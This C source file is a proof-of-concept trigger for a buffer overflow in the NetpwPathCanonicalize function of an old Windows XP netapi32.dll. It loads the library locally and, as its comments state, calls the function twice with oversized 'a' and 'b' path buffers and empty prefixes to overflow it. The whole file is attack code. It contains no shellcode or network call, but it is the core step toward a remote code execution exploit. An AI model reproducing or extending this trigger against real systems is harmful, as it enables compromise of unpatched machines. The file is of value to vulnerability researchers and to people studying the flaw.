
#include <windows.h>

typedef  void (__stdcall * MYPROC)(LPTSTR);

#define PATH1_SIZE      (0xc2*2)
#define PATH2_SIZE      (0x150*2)
#define OUTBUF_SIZE     0x440
#define PREFIX_SIZE     0x410

int main()
{	
	char PathName1[PATH1_SIZE];
	char PathName2[PATH2_SIZE];
	char Outbuf[OUTBUF_SIZE];
	int OutbufLen=OUTBUF_SIZE;
	char Prefix1[PREFIX_SIZE];
	char Prefix2[PREFIX_SIZE];
	long PathType1=44;
	long PathType2=44;

	//load vulnerability netapi32.dll which we got from a WINXP sp0 host  	
	HINSTANCE LibHandle;
	MYPROC Trigger;
	char dll[ ] = "./netapi32.dll"; // care for the path 
	char VulFunc[ ] = "NetpwPathCanonicalize";

	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);

    // fill PathName
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,0,sizeof(PathName1));
	memset(PathName1,'a',sizeof(PathName1)-2);

	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,0,sizeof(PathName2));
	memset(PathName2,'b',sizeof(PathName2)-2);

    // set Prefix as a null string
	memset(Prefix1,0,sizeof(Prefix1));
	memset(Prefix2,0,sizeof(Prefix2));

    // call NetpwPathCanonicalize several times to overflow
	(Trigger)(PathName1,Outbuf,1        ,Prefix1,&PathType1,0);
	(Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&PathType2,0);

	FreeLibrary(LibHandle);
}

